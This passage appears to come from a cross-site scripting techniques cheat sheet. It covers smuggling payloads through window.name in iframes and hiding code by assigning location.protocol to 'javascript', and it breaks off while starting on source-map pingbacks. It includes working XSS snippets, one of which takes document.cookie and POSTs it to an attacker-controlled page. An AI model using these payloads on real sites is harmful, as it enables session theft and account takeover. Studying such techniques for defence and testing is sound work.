  md: '# Window name payloads


    Another common trick in the XSS arsenal is to use window.name to smug payloads
    to other domains or pages. Browsers are crashing down on this by removing the
    name for top-level domain navigations but this technique still works fine using
    iframes:


    ```

    <iframe src=//target name=alert(1)></iframe>

    <!--target-->

    <script>eval(name)</script>

    ```


    You can smug cookies in too and retrieve them when the page is navigated to a
    page you control. For example:


    ```

    <script>name=document.cookie</script>

    <a href="//attacker">test</a>

    <!--Attacker controlled page-->

    <script>fetch(''/collect-cookie'', {method: "post",body:name})</script>

    ```


    # Assignable protocol


    I recently discovered you could use the protocol property of the location object
    to conceal a payload. This is an improvement on window name payloads because you
    don''t require a separate page. Inside JavaScript you simply assign "javascript"
    to the protocol property and then because the URL is treated as JavaScript and
    the http// is treated as a comment you can then use a new line in the hash or
    query string to execute arbitrary JS:


    ```

    location.protocol=''javascript''

    ```


    ```

    foo.html#%@alert(1337)

    ```


    # Source maps to create pingbacks


    Source maps are a cool way of managing a DNS/HTTP interaction that you could use
    to exfiltrate data. If you have an injection inside a single line comment, you
    can use a source map request to exfiltr the data after the comment. There is one
    problem though, it requires that the victim has devtools open. You can use that
    to your advantage if you do get a pingback you can be pretty sure your victim
    had devtools open. Here''s how it works:'
